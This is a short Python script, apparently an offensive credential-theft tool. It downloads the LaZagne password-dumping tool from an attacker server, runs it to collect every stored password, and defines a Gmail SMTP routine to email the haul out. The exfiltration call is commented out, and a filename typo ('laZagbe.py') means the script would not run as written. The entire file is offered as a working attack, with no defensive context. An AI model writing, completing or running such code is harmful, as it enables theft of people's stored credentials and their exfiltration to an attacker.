#!/usr/bin/env python
import requests, subprocess, smtplib

def download(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as out_file:
        out_file.write(get_response.content)

def send_mail(email, psswd, message):
    server = smtplib.SMTP("smtp.gmail.com", 587) #(smtp_server, port)
    server.starttls()
    server.login(email, psswd)
    server.sendmail(email, email, message) #(from, to, email_content)
    server.quit()

server_ip = ''
os = ''
download(f'http://{server_ip}/black-files/LaZagne/{os}/laZagne.py')

captured_passwords = subprocess.check_output('python laZagbe.py all', shell=True)

#send_mail(email, password, captured_passwords)

